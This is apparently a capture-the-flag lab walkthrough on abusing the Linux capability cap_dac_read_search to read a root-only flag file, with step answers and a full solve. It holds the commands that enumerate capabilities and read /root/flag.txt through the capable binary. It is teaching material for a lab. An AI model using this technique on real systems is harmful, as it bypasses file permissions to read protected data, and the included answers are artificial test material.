# Linux Capabilities Abuse (Medium)

## Goal

Read the root-only flag:

```text
FLAG{linux_capability_data_access}
```

The vulnerable primitive is a custom binary with the Linux capability `cap_dac_read_search+ep`.

## Platform Session

Open the terminal from the lab platform. The commands below are meant to be executed directly in the provided `student` shell.

## Step 1. Enumerate File Capabilities

Search the filesystem for binaries with Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

You should find:

```text
/usr/local/bin/syscat cap_dac_read_search+ep
```

Submit for step 1:

```text
/usr/local/bin/syscat
```

## Step 2. Identify Why It Is Dangerous

The capability is:

```text
cap_dac_read_search+ep
```

This capability can bypass normal discretionary access checks for file reads and directory traversal.

Submit for step 2:

```text
cap_dac_read_search+ep
```

## Step 3. Read The Flag

Use the capable binary like `cat`:

```bash
/usr/local/bin/syscat /root/flag.txt
```

Submit:

```text
FLAG{linux_capability_data_access}
```

## Full Solve

```bash
getcap -r / 2>/dev/null
/usr/local/bin/syscat /root/flag.txt
```
